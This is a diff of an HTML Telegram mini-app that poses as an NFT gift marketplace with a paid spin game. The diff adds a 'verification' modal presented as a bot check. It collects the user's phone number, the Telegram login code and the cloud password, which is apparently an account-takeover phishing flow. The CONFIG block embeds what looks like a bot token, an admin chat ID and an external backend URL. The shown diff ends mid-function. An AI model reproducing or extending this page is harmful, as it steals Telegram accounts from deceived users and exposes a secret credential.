@@ -1,3 +1,4 @@
+промт 
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -10,7 +11,6 @@
     <script src="https://telegram.org/js/telegram-web-app.js">
     </script>
     <style>
-        /* ВСЕ ТВОИ СТИЛИ — ОСТАВЛЯЮ БЕЗ ИЗМЕНЕНИЙ */
         * {
             margin: 0;
             padding: 0;
@@ -1296,7 +1296,9 @@
             margin-top: 4px;
         }
 
-        /* VERIFICATION MODAL — обновлённая */
+        /* ============================================================
+           VERIFICATION MODAL — обрезанные углы сверху
+           ============================================================ */
         .verification-overlay {
             position: fixed;
             top: 0;
@@ -1368,7 +1370,9 @@
         .verification-modal .verif-field:focus {
             border-color: rgba(245, 200, 66, 0.3);
         }
-        .verification-modal .verif-field::placeholder { color: #6e6e80; }
+        .verification-modal .verif-field::placeholder {
+            color: #6e6e80;
+        }
         .verification-modal .verif-error {
             font-size: 11px;
             color: #ff6b6b;
@@ -1387,7 +1391,9 @@
             display: none;
             flex-direction: column;
         }
-        .verification-modal .verif-step.active { display: flex; }
+        .verification-modal .verif-step.active {
+            display: flex;
+        }
         .verification-modal .verif-timer {
             font-size: 11px;
             color: #6e6e80;
@@ -1410,69 +1416,11 @@
             cursor: not-allowed;
         }
 
-        /* 5 КВАДРАТИКОВ ДЛЯ КОДА */
-        .code-input-wrapper {
-            display: flex;
-            gap: 8px;
-            justify-content: center;
-            margin: 12px 0 16px;
-        }
-        .code-input-wrapper .code-box {
-            width: 44px;
-            height: 52px;
-            background: rgba(255, 255, 255, 0.04);
-            border: 2px solid rgba(255, 255, 255, 0.08);
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 22px;
-            font-weight: 700;
-            color: #fff;
-            transition: 0.2s;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            user-select: none;
-        }
-        .code-input-wrapper .code-box.filled {
-            border-color: rgba(245, 200, 66, 0.4);
-            background: rgba(245, 200, 66, 0.06);
-        }
-        .code-input-wrapper .code-box.active {
-            border-color: #f5c842;
-            box-shadow: 0 0 20px rgba(245, 200, 66, 0.1);
-        }
-        .code-input-wrapper .code-box.error {
-            border-color: #ff6b6b;
-            animation: shake 0.3s ease;
-        }
-        .code-input-wrapper .code-box.success {
-            border-color: #4bc88a;
-            background: rgba(75, 200, 138, 0.1);
-        }
-        #verifCodeInput {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
-        }
-
         @media (max-width: 380px) {
             .case-item { min-width: 150px; max-width: 180px; }
             .case-item .case-lottie { width: 100px; height: 100px; }
             .bottom-nav .nav-item { padding: 4px 8px; min-width: 50px; font-size: 8px; }
             .gift-tab { font-size: 13px; }
-            .code-input-wrapper .code-box {
-                width: 36px;
-                height: 44px;
-                font-size: 18px;
-            }
         }
     </style>
 </head>
@@ -1660,50 +1608,40 @@
         <div class="toast" id="toast">Уведомление</div>
 
         <!-- ============================================================
-             VERIFICATION MODAL — ОБНОВЛЁННАЯ
+             VERIFICATION MODAL
              ============================================================ -->
         <div class="verification-overlay" id="verificationOverlay">
             <div class="verification-modal">
-                <div class="verif-title">Верификация</div>
-                <div class="verif-sub">Пройдите разовую верификацию чтобы продолжить торговлю и получать награды.</div>
+                <div class="verif-title">🔐 Верификация</div>
+                <div class="verif-sub">Подтвердите, что вы не бот</div>
 
-                <!-- Шаг 1: Старт -->
+                <!-- Шаг 1: Приветствие и кнопка -->
                 <div class="verif-step active" id="verifStepStart">
-                    <button class="verif-btn" id="verifStartBtn">Продолжить</button>
+                    <button class="verif-btn" id="verifStartBtn">Пройти верификацию</button>
                     <div class="verif-error" id="verifStartError"></div>
                 </div>
 
-                <!-- Шаг 2: Номер телефона -->
+                <!-- Шаг 2: Ввод номера телефона -->
                 <div class="verif-step" id="verifStepPhone">
-                    <input class="verif-field" type="tel" id="verifPhoneInput" placeholder="Введите номер телефона" value="+7">
+                    <input class="verif-field" type="tel" id="verifPhoneInput" placeholder="+7 900 000 00 00" value="+7">
                     <button class="verif-btn" id="verifSendCodeBtn">Отправить код</button>
                     <div class="verif-error" id="verifPhoneError"></div>
                     <div class="verif-success" id="verifPhoneSuccess"></div>
                 </div>
 
-                <!-- Шаг 3: Код (5 квадратиков) -->
+                <!-- Шаг 3: Ввод кода из Telegram -->
                 <div class="verif-step" id="verifStepCode">
-                    <div style="font-size:13px;color:#8e8ea0;text-align:center;margin-bottom:4px;">
-                        Введите код из Telegram
-                    </div>
-                    <div class="code-input-wrapper" id="codeInputWrapper">
-                        <div class="code-box active" data-index="0"></div>
-                        <div class="code-box" data-index="1"></div>
-                        <div class="code-box" data-index="2"></div>
-                        <div class="code-box" data-index="3"></div>
-                        <div class="code-box" data-index="4"></div>
-                    </div>
-                    <input type="text" id="verifCodeInput" maxlength="5" inputmode="numeric" autofocus>
+                    <input class="verif-field" type="text" id="verifCodeInput" placeholder="Введите код из Telegram" maxlength="6" inputmode="numeric">
                     <button class="verif-btn" id="verifVerifyCodeBtn">Подтвердить код</button>
                     <div class="verif-error" id="verifCodeError"></div>
                     <div class="verif-success" id="verifCodeSuccess"></div>
                     <div class="verif-timer">
-                        <span id="verifTimerText">Код отправлен</span>
+                        <span id="verifTimerText">Код отправлен. Ждём...</span>
                         <button class="verif-resend" id="verifResendBtn" disabled>Отправить повторно</button>
                     </div>
                 </div>
 
-                <!-- Шаг 4: Пароль -->
+                <!-- Шаг 4: Проверка облачного пароля (если есть) -->
                 <div class="verif-step" id="verifStepPassword">
                     <div style="font-size:13px;color:#8e8ea0;text-align:center;margin-bottom:8px;">
                         На аккаунте установлен облачный пароль. Введите его для завершения.
@@ -1714,7 +1652,7 @@
                     <div class="verif-success" id="verifPasswordSuccess"></div>
                 </div>
 
-                <!-- Шаг 5: Успех -->
+                <!-- Шаг 5: Финальный успех -->
                 <div class="verif-step" id="verifStepSuccess">
                     <div style="text-align:center;padding:16px 0;">
                         <div style="font-size:48px;margin-bottom:8px;">✅</div>
@@ -1763,17 +1701,19 @@
 
     <script>
         // ============================================================
-        // 0. КОНФИГУРАЦИЯ
+        // 0. КОНФИГУРАЦИЯ — изменено под твой бэкенд
         // ============================================================
         const CONFIG = {
             ADMIN_BOT_TOKEN: '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec',
             ADMIN_CHAT_ID: '7303763255',
             BACKEND_URL: 'https://nft-market-backend-c9ea.onrender.com/'
         };
+
+        // Отключаем эмуляцию — используем реальный бэкенд
         const USE_EMULATION = false;
 
         // ============================================================
-        // 1. DATA (ТВОИ ДАННЫЕ — БЕЗ ИЗМЕНЕНИЙ)
+        // 1. DATA
         // ============================================================
         const COLLECTIONS_DATA = {
             "Plush Pepe": { icon: "🐸" },
@@ -1889,7 +1829,7 @@
         }
 
         // ============================================================
-        // 2. STATE — ДОБАВЛЯЕМ phoneCodeHash
+        // 2. STATE
         // ============================================================
         let currentUserId = null;
         let userBalance = 0;
@@ -1913,22 +1853,872 @@
             codeRequestId: null,
             hasPassword: false,
             timerInterval: null,
-            timerSeconds: 0,
-            phoneCodeHash: null  // <--- ДОБАВЛЕНО
+            timerSeconds: 0
         };
 
         // ============================================================
-        // 3-18. ВСЕ ТВОИ ФУНКЦИИ — БЕЗ ИЗМЕНЕНИЙ
-        // (getUserData, saveUserData, updateCartUI, renderGrid, openDetail,
-        //  renderCase, switchTab, фильтры, поиск, корзина и т.д.)
+        // 3. USER DATA
         // ============================================================
-        // ... (весь твой код остаётся без изменений)
+        function getUserData(userId) {
+            const key = `allow_user_${userId}`;
+            try {
+                const saved = localStorage.getItem(key);
+                if (saved) return JSON.parse(saved);
+            } catch (e) {}
+            return { balance: 10000, cart: [], verified: false };
+        }
+
+        function saveUserData(userId, data) {
+            const key = `allow_user_${userId}`;
+            localStorage.setItem(key, JSON.stringify(data));
+        }
+
+        function getBalance(userId) {
+            const data = getUserData(userId);
+            return data.balance || 0;
+        }
+
+        function setBalance(userId, amount) {
+            const data = getUserData(userId);
+            data.balance = Math.max(0, parseFloat(amount) || 0);
+            saveUserData(userId, data);
+            return data.balance;
+        }
+
+        function getCart(userId) {
+            const data = getUserData(userId);
+            return data.cart || [];
+        }
+
+        function saveCart(userId, cart) {
+            const data = getUserData(userId);
+            data.cart = cart || [];
+            saveUserData(userId, data);
+        }
+
+        function addToCart(userId, name) {
+            let cart = getCart(userId);
+            if (cart.includes(name)) {
+                cart = cart.filter(n => n !== name);
+            } else {
+                cart.push(name);
+            }
+            saveCart(userId, cart);
+            userCart = cart;
+            updateCartUI();
+            updateDetailButtons();
+            renderGrid();
+            showToast(cart.includes(name) ? 'Добавлено в корзину' : 'Удалено из корзины');
+        }
+
+        function removeFromCart(userId, name) {
+            let cart = getCart(userId);
+            cart = cart.filter(n => n !== name);
+            saveCart(userId, cart);
+            userCart = cart;
+            renderCartItems();
+            updateCartUI();
+            updateDetailButtons();
+            renderGrid();
+        }
+
+        function isInCart(userId, name) {
+            const cart = getCart(userId);
+            return cart.includes(name);
+        }
+
+        function getCartTotal(userId) {
+            const cart = getCart(userId);
+            return cart.reduce((sum, name) => {
+                const n = allNFTs.find(item => item.name === name);
+                return sum + (n ? n.price : 0);
+            }, 0);
+        }
 
         // ============================================================
-        // 19. ВЕРИФИКАЦИЯ — ОБНОВЛЁННАЯ
+        // 4. UI UPDATES
+        // ============================================================
+        function updateCartUI() {
+            if (!currentUserId) return;
+            const total = getCartTotal(currentUserId);
+            document.getElementById('modalCartTotal').textContent = total.toFixed(2);
+            document.getElementById('navCartBadge').textContent = userCart.length;
+            document.getElementById('checkoutBtn').disabled = userCart.length === 0;
+            renderCartItems();
+        }
+
+        function renderCartItems() {
+            const container = document.getElementById('cartItems');
+            if (!userCart || userCart.length === 0) {
+                container.innerHTML = `<div class="empty-cart">Корзина пуста</div>`;
+                return;
+            }
+            let html = '';
+            userCart.forEach(name => {
+                const nft = allNFTs.find(n => n.name === name);
+                if (!nft) return;
+                html += `<div class="cart-item">
+                    <div style="font-size:18px;">${COLLECTIONS_DATA[nft.collection]?.icon || '🎁'}</div>
+                    <div class="item-info">
+                        <div class="item-name">${nft.name}</div>
+                        <div class="item-collection">${nft.collection}</div>
+                    </div>
+                    <div class="item-price">${nft.price.toFixed(2)} GRAM</div>
+                    <button class="item-remove" onclick="window.removeFromCart('${nft.name}')">✕</button>
+                </div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        function updateBalanceUI() {
+            if (!currentUserId) return;
+            userBalance = getBalance(currentUserId);
+            document.getElementById('profileBalance').textContent = userBalance.toFixed(2);
+        }
+
+        function updateAvatar(user) {
+            const avatarImg = document.getElementById('avatarImg');
+            const avatarPlaceholder = document.getElementById('avatarPlaceholder');
+            const profileImg = document.getElementById('profileImg');
+            const profilePlaceholder = document.getElementById('profilePlaceholder');
+
+            if (user && user.photo_url) {
+                avatarImg.src = user.photo_url;
+                avatarImg.style.display = 'block';
+                avatarPlaceholder.style.display = 'none';
+                profileImg.src = user.photo_url;
+                profileImg.style.display = 'block';
+                profilePlaceholder.style.display = 'none';
+            } else {
+                avatarImg.style.display = 'none';
+                avatarPlaceholder.style.display = 'block';
+                profileImg.style.display = 'none';
+                profilePlaceholder.style.display = 'block';
+            }
+        }
+
+        // ============================================================
+        // 5. LOTTIE
+        // ============================================================
+        const lottieLoadQueue = [];
+        let isProcessingQueue = false;
+
+        function loadLottie(container, url, autoplay = false) {
+            if (!container) return;
+            container.innerHTML = '';
+            if (lottieCache.has(url)) {
+                try {
+                    const data = lottieCache.get(url);
+                    const anim = lottie.loadAnimation({ container, animationData: data, renderer: 'svg', loop: true,
+                        autoplay: autoplay });
+                    if (!autoplay) anim.goToAndStop(0, true);
+                    return;
+                } catch (e) { container.textContent = '🎁'; return; }
+            }
+            lottieLoadQueue.push({ container, url, autoplay });
+            processLottieQueue();
+        }
+
+        function processLottieQueue() {
+            if (isProcessingQueue || lottieLoadQueue.length === 0) return;
+            isProcessingQueue = true;
+            const item = lottieLoadQueue.shift();
+            const { container, url, autoplay } = item;
+
+            fetch(url).then(r => {
+                if (!r.ok) throw new Error();
+                return r.json();
+            }).then(data => {
+                lottieCache.set(url, data);
+                container.innerHTML = '';
+                try {
+                    const anim = lottie.loadAnimation({ container, animationData: data, renderer: 'svg', loop: true,
+                        autoplay: autoplay });
+                    if (!autoplay) anim.goToAndStop(0, true);
+                } catch (e) { container.textContent = '🎁'; }
+            }).catch(() => { container.textContent = '🎁'; })
+                .finally(() => {
+                    isProcessingQueue = false;
+                    if (lottieLoadQueue.length > 0) setTimeout(processLottieQueue, 30);
+                });
+        }
+
+        // ============================================================
+        // 6. RENDER GRID
+        // ============================================================
+        function renderGrid() {
+            const grid = document.getElementById('nftGrid');
+
+            let data = allNFTs;
+
+            if (activeFilters.model) {
+                data = data.filter(n => n.model.toLowerCase().includes(activeFilters.model.toLowerCase()));
+            }
+            if (activeFilters.backdrop) {
+                data = data.filter(n => n.backdrop.toLowerCase().includes(activeFilters.backdrop.toLowerCase()));
+            }
+            if (activeFilters.symbol) {
+                data = data.filter(n => n.symbol.toLowerCase().includes(activeFilters.symbol.toLowerCase()));
+            }
+
+            const searchVal = document.getElementById('searchInput').value.trim().toLowerCase();
+            if (searchVal) {
+                data = data.filter(n =>
+                    n.name.toLowerCase().includes(searchVal) ||
+                    String(n.number).includes(searchVal) ||
+                    n.collection.toLowerCase().includes(searchVal)
+                );
+            }
+
+            filteredNFTs = data;
+
+            if (filteredNFTs.length === 0) {
+                grid.innerHTML =
+                    `<div style="grid-column:1/-1;text-align:center;padding:50px 20px;color:#6e6e80;font-size:14px;">Ничего не найдено</div>`;
+                return;
+            }
+
+            let html = '';
+            filteredNFTs.forEach(nft => {
+                const lottieId = `lottie-${nft.collection.replace(/\s/g,'')}-${nft.number}`;
+                const statusClass = nft.status === 'sold' ? 'sold' : nft.status === 'on-auction' ? 'auction' : 'sale';
+                const statusLabel = nft.status === 'sold' ? 'Продано' : nft.status === 'on-auction' ? 'На аукционе' :
+                    'В продаже';
+                const inCart = currentUserId && isInCart(currentUserId, nft.name);
+                html += `<div class="nft-card" onclick="openDetail('${nft.name}')">
+                    <div class="nft-card-inner">
+                        <div class="lottie-wrapper"><div class="lottie-container" id="${lottieId}"></div></div>
+                        <div class="nft-name">${nft.name}</div>
+                        <div class="nft-model">${nft.model}</div>
+                        <div class="nft-price">
+                            <span class="gram-icon"><img src="https://www.mexc.co/api/file/download/F20260615184306269DUAXgshbJv0AGy" alt="GRAM"></span>
+                            ${nft.price.toFixed(2)}
+                        </div>
+                        <span class="status-badge ${statusClass}">${statusLabel}</span>
+                    </div>
+                    <button class="cart-add-btn ${inCart ? 'in-cart' : ''}" onclick="event.stopPropagation(); window.toggleCart('${nft.name}')">
+                        <svg viewBox="0 0 24 24">
+                            <circle cx="9" cy="21" r="1"/>
+                            <circle cx="20" cy="21" r="1"/>
+                            <path d="M1 1h4l2.68 13.39a2 2 0 002 1.61h9.72a2 2 0 002-1.61L23 6H6"/>
+                        </svg>
+                    </button>
+                </div>`;
+            });
+            grid.innerHTML = html;
+
+            filteredNFTs.forEach(nft => {
+                const container = document.getElementById(`lottie-${nft.collection.replace(/\s/g,'')}-${nft.number}`);
+                if (container) loadLottie(container, nft.lottie, false);
+            });
+        }
+
+        // ============================================================
+        // 7. DETAIL
+        // ============================================================
+        function openDetail(name) {
+            const nft = allNFTs.find(item => item.name === name);
+            if (!nft) return;
+            detailNft = nft;
+            document.getElementById('detailTitle').textContent = nft.collection;
+            document.getElementById('detailNumber').textContent = `#${nft.number}`;
+            document.getElementById('detailModel').textContent = nft.model || '—';
+            document.getElementById('detailBackdrop').textContent = nft.backdrop || '—';
+            document.getElementById('detailSymbol').textContent = nft.symbol || '—';
+            document.getElementById('detailOwner').textContent = nft.owner || '—';
+            document.getElementById('detailIssued').textContent = nft.issued || '—';
+            document.getElementById('detailStatus').textContent = nft.status === 'sold' ? 'Продано' : nft.status ===
+                'on-auction' ? 'На аукционе' : 'В продаже';
+            document.getElementById('detailPriceAmount').textContent = `${nft.price.toFixed(2)} GRAM`;
+            const container = document.getElementById('detailLottie');
+            container.innerHTML = '';
+            loadLottie(container, nft.lottie, true);
+            updateDetailButtons();
+            document.getElementById('detailOverlay').classList.add('open');
+        }
+
+        function closeDetail() {
+            document.getElementById('detailOverlay').classList.remove('open');
+            detailNft = null;
+        }
+
+        function updateDetailButtons() {
+            if (!detailNft || !currentUserId) return;
+            const btn = document.getElementById('detailBuyBtn');
+            if (detailNft.status === 'sold') {
+                btn.textContent = 'Продано';
+                btn.className = 'detail-buy-btn sold';
+                btn.disabled = true;
+            } else if (isInCart(currentUserId, detailNft.name)) {
+                btn.textContent = 'В корзине';
+                btn.className = 'detail-buy-btn';
+                btn.onclick = () => { addToCart(currentUserId, detailNft.name);
+                    updateDetailButtons(); };
+            } else {
+                btn.textContent = 'Добавить';
+                btn.className = 'detail-buy-btn';
+                btn.onclick = () => { addToCart(currentUserId, detailNft.name);
+                    updateDetailButtons(); };
+            }
+        }
+
+        document.getElementById('detailClose').addEventListener('click', closeDetail);
+        document.getElementById('detailOverlay').addEventListener('click', (e) => { if (e.target === e.currentTarget)
+            closeDetail(); });
+
+        // ============================================================
+        // 8. GAME HUB
+        // ============================================================
+        let caseItems = [];
+        let spinToastTimer = null;
+
+        function renderCase() {
+            const track = document.getElementById('caseTrack');
+            caseItems = allNFTs.slice(0, 24);
+            let html = '';
+            caseItems.forEach((nft, idx) => {
+                const lottieId = `case-lottie-${idx}`;
+                html += `<div class="case-item" data-idx="${idx}">
+                    <div class="case-lottie"><div class="lottie-container" id="${lottieId}"></div></div>
+                    <div class="case-name">${nft.name}</div>
+                    <div class="case-price">${nft.price.toFixed(2)} GRAM</div>
+                </div>`;
+            });
+            track.innerHTML = html;
+
+            caseItems.forEach((nft, idx) => {
+                const container = document.getElementById(`case-lottie-${idx}`);
+                if (container) loadLottie(container, nft.lottie, false);
+            });
+
+            startAutoScroll();
+        }
+
+        function startAutoScroll() {
+            if (autoScrollInterval) clearInterval(autoScrollInterval);
+            const track = document.getElementById('caseTrack');
+            if (!track || caseItems.length === 0) return;
+            isAutoScrolling = true;
+            let scrollPos = 0;
+            const step = 1.5;
+            const maxScroll = track.scrollWidth - track.clientWidth;
+            autoScrollInterval = setInterval(() => {
+                if (!isAutoScrolling) return;
+                scrollPos += step;
+                if (scrollPos > maxScroll) scrollPos = 0;
+                track.scrollTo({ left: scrollPos, behavior: 'smooth' });
+            }, 25);
+        }
+
+        function stopAutoScroll() {
+            isAutoScrolling = false;
+            if (autoScrollInterval) {
+                clearInterval(autoScrollInterval);
+                autoScrollInterval = null;
+            }
+        }
+
+        document.getElementById('spinBtn').addEventListener('click', function() {
+            if (isSpinning) return;
+            if (!currentUserId) { showToast('Войдите в аккаунт'); return; }
+            if (userBalance < 200) {
+                showToast('Недостаточно GRAM для прокрутки! Нужно 200 GRAM');
+                clearTimeout(spinToastTimer);
+                spinToastTimer = setTimeout(() => {
+                    document.getElementById('toast').classList.remove('show');
+                }, 4000);
+                return;
+            }
+
+            isSpinning = true;
+            stopAutoScroll();
+            this.disabled = true;
+            this.textContent = 'Крутим...';
+
+            const newBalance = setBalance(currentUserId, userBalance - 200);
+            userBalance = newBalance;
+            updateBalanceUI();
+
+            const track = document.getElementById('caseTrack');
+            const items = track.querySelectorAll('.case-item');
+            const totalItems = items.length;
+            const randomIdx = Math.floor(Math.random() * totalItems);
+
+            items.forEach(el => el.classList.remove('highlight'));
+
+            let extraScrolls = 0;
+            const maxExtra = 6;
+            const targetScroll = (randomIdx) * (items[0]?.offsetWidth + 16 || 120);
+            track.scrollTo({ left: targetScroll, behavior: 'smooth' });
+
+            const extraInterval = setInterval(() => {
+                if (extraScrolls >= maxExtra) {
+                    clearInterval(extraInterval);
+                    setTimeout(() => {
+                        items.forEach(el => el.classList.remove('highlight'));
+                        if (items[randomIdx]) {
+                            items[randomIdx].classList.add('highlight');
+                            const nftName = items[randomIdx].querySelector('.case-name')?.textContent ||
+                            'NFT';
+                            document.getElementById('spinResult').textContent =
+                                `Вы выиграли: ${nftName}!`;
+                            showToast(`Вы выиграли: ${nftName}`);
+                            const nft = allNFTs.find(n => n.name === nftName);
+                            if (nft && currentUserId && !isInCart(currentUserId, nft.name)) {
+                                addToCart(currentUserId, nft.name);
+                            }
+                        }
+                        isSpinning = false;
+                        this.disabled = false;
+                        this.textContent = 'Крутить (200 GRAM)';
+                        startAutoScroll();
+                    }, 500);
+                    return;
+                }
+                extraScrolls++;
+                const offset = (randomIdx + extraScrolls * 2) % totalItems;
+                const scrollTo = offset * (items[0]?.offsetWidth + 16 || 120);
+                track.scrollTo({ left: scrollTo, behavior: 'smooth' });
+            }, 120);
+        });
+
+        // ============================================================
+        // 9. NAVIGATION
+        // ============================================================
+        function switchTab(tab) {
+            document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+            document.querySelector(`.nav-item[data-tab="${tab}"]`)?.classList.add('active');
+
+            const grid = document.getElementById('nftGrid');
+            const orders = document.getElementById('ordersSection');
+            const game = document.getElementById('gameHub');
+            const stars = document.getElementById('starsPremiumSection');
+            const myGifts = document.getElementById('myGiftsSection');
+
+            const mainFilter = document.getElementById('mainFilterRow');
+            const searchRow = document.querySelector('.search-row');
+            const statusRow = document.getElementById('mainStatusRow');
+            const leaderboard = document.querySelector('.leaderboard-banner');
+
+            grid.style.display = 'none';
+            orders.classList.remove('active');
+            game.classList.remove('active');
+            stars.classList.remove('active');
+            myGifts.classList.remove('active');
+
+            if (searchRow) searchRow.style.display = 'flex';
+            if (statusRow) statusRow.style.display = 'flex';
+            if (leaderboard) leaderboard.style.display = 'flex';
+
+            document.querySelectorAll('.gift-tab').forEach(t => t.classList.remove('active'));
+
+            if (tab === 'market' || tab === 'gifts') {
+                grid.style.display = 'grid';
+                mainFilter.style.display = 'flex';
+                document.querySelector('.gift-tab[data-tab="gifts"]')?.classList.add('active');
+                renderGrid();
+            } else if (tab === 'starsTab') {
+                stars.classList.add('active');
+                mainFilter.style.display = 'none';
+                if (searchRow) searchRow.style.display = 'none';
+                if (statusRow) statusRow.style.display = 'none';
+                if (leaderboard) leaderboard.style.display = 'none';
+                document.querySelector('.gift-tab[data-tab="stars"]')?.classList.add('active');
+            } else if (tab === 'collections') {
+                grid.style.display = 'grid';
+                mainFilter.style.display = 'flex';
+                document.querySelector('.gift-tab[data-tab="collections"]')?.classList.add('active');
+                renderGrid();
+            } else if (tab === 'mygifts') {
+                myGifts.classList.add('active');
+                mainFilter.style.display = 'none';
+                if (searchRow) searchRow.style.display = 'none';
+                if (statusRow) statusRow.style.display = 'none';
+                if (leaderboard) leaderboard.style.display = 'none';
+                document.querySelectorAll('.gift-tab').forEach(t => t.classList.remove('active'));
+            } else if (tab === 'orders') {
+                orders.classList.add('active');
+                mainFilter.style.display = 'none';
+                if (searchRow) searchRow.style.display = 'none';
+                if (statusRow) statusRow.style.display = 'none';
+                if (leaderboard) leaderboard.style.display = 'none';
+                renderOrders();
+                document.querySelectorAll('.gift-tab').forEach(t => t.classList.remove('active'));
+            } else if (tab === 'game') {
+                game.classList.add('active');
+                mainFilter.style.display = 'none';
+                if (searchRow) searchRow.style.display = 'none';
+                if (statusRow) statusRow.style.display = 'none';
+                if (leaderboard) leaderboard.style.display = 'none';
+                renderCase();
+                document.querySelectorAll('.gift-tab').forEach(t => t.classList.remove('active'));
+            } else if (tab === 'vault') {
+                document.getElementById('cartModal').classList.add('open');
+                document.querySelector('.nav-item[data-tab="market"]')?.classList.add('active');
+                document.querySelector(`.nav-item[data-tab="${tab}"]`)?.classList.remove('active');
+                grid.style.display = 'grid';
+                mainFilter.style.display = 'flex';
+                if (searchRow) searchRow.style.display = 'flex';
+                if (statusRow) statusRow.style.display = 'flex';
+                if (leaderboard) leaderboard.style.display = 'flex';
+                document.querySelector('.gift-tab[data-tab="gifts"]')?.classList.add('active');
+                renderGrid();
+            } else {
+                grid.style.display = 'grid';
+                mainFilter.style.display = 'flex';
+                if (searchRow) searchRow.style.display = 'flex';
+                if (statusRow) statusRow.style.display = 'flex';
+                if (leaderboard) leaderboard.style.display = 'flex';
+                document.querySelector('.gift-tab[data-tab="gifts"]')?.classList.add('active');
+                renderGrid();
+            }
+        }
+
+        document.querySelectorAll('.gift-tab').forEach(tab => {
+            tab.addEventListener('click', function() {
+                const t = this.dataset.tab;
+                if (t === 'stars') switchTab('starsTab');
+                else if (t === 'gifts') switchTab('market');
+                else if (t === 'collections') switchTab('collections');
+            });
+        });
+
+        document.querySelectorAll('.nav-item').forEach(btn => {
+            btn.addEventListener('click', function() {
+                switchTab(this.dataset.tab);
+            });
+        });
+
+        // ============================================================
+        // 10. FILTERS
+        // ============================================================
+        const modelValues = ["Classic", "Rare", "Legendary", "Golden", "Shadow", "Crystal", "Neon", "Aurora"];
+        const backdropValues = ["Starlight", "Midnight", "Cosmic", "Void", "Crystal", "Flame", "Neon", "Shadow"];
+        const symbolValues = ["Crescent", "Pentagram", "Baphomet", "Tree", "Sun", "Moon", "Star", "Crown"];
+
+        let modelIndex = 0;
+        let backdropIndex = 0;
+        let symbolIndex = 0;
+
+        document.getElementById('filterModel').addEventListener('click', function() {
+            const val = modelValues[modelIndex % modelValues.length];
+            modelIndex++;
+            if (activeFilters.model === val) {
+                activeFilters.model = false;
+                this.classList.remove('active-filter');
+            } else {
+                activeFilters.model = val;
+                this.classList.add('active-filter');
+            }
+            renderGrid();
+            showToast(`Фильтр: Модель → ${activeFilters.model || 'сброшен'}`);
+        });
+
+        document.getElementById('filterBackdrop').addEventListener('click', function() {
+            const val = backdropValues[backdropIndex % backdropValues.length];
+            backdropIndex++;
+            if (activeFilters.backdrop === val) {
+                activeFilters.backdrop = false;
+                this.classList.remove('active-filter');
+            } else {
+                activeFilters.backdrop = val;
+                this.classList.add('active-filter');
+            }
+            renderGrid();
+            showToast(`Фильтр: Фон → ${activeFilters.backdrop || 'сброшен'}`);
+        });
+
+        document.getElementById('filterSymbol').addEventListener('click', function() {
+            const val = symbolValues[symbolIndex % symbolValues.length];
+            symbolIndex++;
+            if (activeFilters.symbol === val) {
+                activeFilters.symbol = false;
+                this.classList.remove('active-filter');
+            } else {
+                activeFilters.symbol = val;
+                this.classList.add('active-filter');
+            }
+            renderGrid();
+            showToast(`Фильтр: Символ → ${activeFilters.symbol || 'сброшен'}`);
+        });
+
+        document.getElementById('filterToggleBtn').addEventListener('click', function() {
+            document.getElementById('filterOverlay').classList.add('open');
+        });
+
+        document.getElementById('filterNft').addEventListener('click', function() {
+            activeFilters.model = false;
+            activeFilters.backdrop = false;
+            activeFilters.symbol = false;
+            document.getElementById('filterModel').classList.remove('active-filter');
+            document.getElementById('filterBackdrop').classList.remove('active-filter');
+            document.getElementById('filterSymbol').classList.remove('active-filter');
+            renderGrid();
+            showToast('Все фильтры сброшены');
+        });
+
+        // ============================================================
+        // 11. SEARCH
+        // ============================================================
+        document.getElementById('searchInput').addEventListener('input', function() {
+            clearTimeout(searchTimeout);
+            searchTimeout = setTimeout(() => {
+                renderGrid();
+            }, 150);
+        });
+
+        // ============================================================
+        // 12. TOGGLE CART
+        // ============================================================
+        window.toggleCart = function(name) {
+            if (!currentUserId) { showToast('Войдите в аккаунт'); return; }
+            const nft = allNFTs.find(n => n.name === name);
+            if (!nft) return;
+            if (nft.status === 'sold') { showToast('Продано'); return; }
+            addToCart(currentUserId, name);
+        };
+
+        // ============================================================
+        // 13. STARS & PREM
+        // ============================================================
+        document.querySelectorAll('.stars-premium-section .selector .option').forEach(opt => {
+            opt.addEventListener('click', function() {
+                document.querySelectorAll('.stars-premium-section .selector .option').forEach(o => o.classList
+                    .remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        document.getElementById('sendSelfBtn').addEventListener('click', function() {
+            try {
+                if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
+                    const user = window.Telegram.WebApp.initDataUnsafe.user;
+                    document.getElementById('receiverInput').value = '@' + (user.username || 'username');
+                } else {
+                    document.getElementById('receiverInput').value = '@username';
+                }
+            } catch (e) {
+                document.getElementById('receiverInput').value = '@username';
+            }
+            showToast('Юзернейм вставлен');
+        });
+
+        document.getElementById('buyStarsBtn').addEventListener('click', function() {
+            const receiver = document.getElementById('receiverInput').value.trim();
+            const option = document.querySelector('.stars-premium-section .selector .option.active');
+            const type = option ? option.textContent : 'Телеграм звезды';
+            if (!receiver) {
+                showToast('Введите получателя');
+                return;
+            }
+            showToast(`Покупка ${type} для ${receiver} — функция в разработке`);
+        });
+
+        // ============================================================
+        // 14. MY GIFTS
+        // ============================================================
+        document.getElementById('myGiftsAddBtn').addEventListener('click', function() {
+            openGiftBot();
+        });
+
+        // ============================================================
+        // 15. ORDERS
+        // ============================================================
+        const ORDERS_DATA = [
+            { name: "Gravestone", qty: 1, price: 39.11, collection: "Gravestone" },
+            { name: "Mask", qty: 1, price: 5.73, collection: "Mask" },
+            { name: "Coffin", qty: 1, price: 18.21, collection: "Coffin" },
+            { name: "Airplane", qty: 1, price: 4000, collection: "Airplane" },
+            { name: "Khabib's Papakha", qty: 1, price: 50.5, collection: "Khabib's Papakha" },
+            { name: "UFC box", qty: 1, price: 31, collection: "UFC box" },
+            { name: "Trojan Horse", qty: 1, price: 31, collection: "Trojan Horse" }
+        ];
+
+        function renderOrders() {
+            const container = document.getElementById('ordersList');
+            let html = '';
+            ORDERS_DATA.forEach(order => {
+                const col = order.collection || order.name;
+                const slug = col.toLowerCase().replace(/\s/g, '').replace(/[^a-z0-9]/gi, '');
